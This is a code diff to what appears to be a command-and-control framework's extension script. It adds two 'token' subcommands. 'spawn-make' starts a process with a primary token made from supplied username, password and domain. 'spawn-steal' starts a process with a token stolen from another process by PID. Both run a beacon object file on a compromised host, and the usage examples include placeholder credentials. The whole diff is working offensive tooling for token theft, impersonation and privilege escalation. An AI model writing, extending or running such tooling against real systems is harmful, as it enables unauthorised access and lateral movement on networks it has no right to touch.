@@ -97,8 +97,46 @@ _cmd_token_steal.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines)
     ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, "Task: steal access token", hook_impersonate);
 });
 
+var _cmd_token_spawn_make = ax.create_command("spawn-make", "Spawn new process with Primary Token from credentials", "token spawn-make c:\\\\windows\\\\system32\\\\cmd.exe \"/c whoami\" admin P@ssword domain.local 2");
+_cmd_token_spawn_make.addArgString("program", true, "Program to execute");
+_cmd_token_spawn_make.addArgString("arguments", false, "Program arguments");
+_cmd_token_spawn_make.addArgString("username", true);
+_cmd_token_spawn_make.addArgString("password", true);
+_cmd_token_spawn_make.addArgString("domain", true);
+_cmd_token_spawn_make.addArgInt("type", true, "Logon type: 2 - Interactive\n                                        3 - Network\n                                        4 - Batch\n                                        5 - Service\n                                        8 - NetworkCleartext\n                                        9 - NewCredentials");
+_cmd_token_spawn_make.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
+    let program = parsed_json["program"];
+    let arguments = parsed_json["arguments"] || "";
+    let username = parsed_json["username"];
+    let password = parsed_json["password"];
+    let domain = parsed_json["domain"];
+    let type = parsed_json["type"];
+
+    let bof_params = ax.bof_pack("int,wstr,wstr,wstr,wstr,wstr,int", [0, program, arguments, username, password, domain, type]);
+    let bof_path = ax.script_dir() + "_bin/token_spawn." + ax.arch(id) + ".o";
+    let message = `Task: spawn process with Primary Token from credentials (${domain}\\${username})`;
+
+    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, message);
+});
+
+var _cmd_token_spawn_steal = ax.create_command("spawn-steal", "Spawn new process with Primary Token stolen from process", "token spawn-steal 608 c:\\\\windows\\\\system32\\\\cmd.exe \"/c whoami\"");
+_cmd_token_spawn_steal.addArgInt("pid", true, "Process ID to steal token from");
+_cmd_token_spawn_steal.addArgString("program", true, "Program to execute");
+_cmd_token_spawn_steal.addArgString("arguments", false, "Program arguments");
+_cmd_token_spawn_steal.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
+    let pid = parsed_json["pid"];
+    let program = parsed_json["program"];
+    let arguments = parsed_json["arguments"] || "";
+
+    let bof_params = ax.bof_pack("int,wstr,wstr,int", [1, program, arguments, pid]);
+    let bof_path = ax.script_dir() + "_bin/token_spawn." + ax.arch(id) + ".o";
+    let message = `Task: spawn process with Primary Token from PID ${pid}`;
+
+    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, message);
+});
+
 var cmd_token = ax.create_command("token", "Impersonate token");
-cmd_token.addSubCommands([_cmd_token_make, _cmd_token_steal]);
+cmd_token.addSubCommands([_cmd_token_make, _cmd_token_steal, _cmd_token_spawn_make, _cmd_token_spawn_steal]);
 
 
 
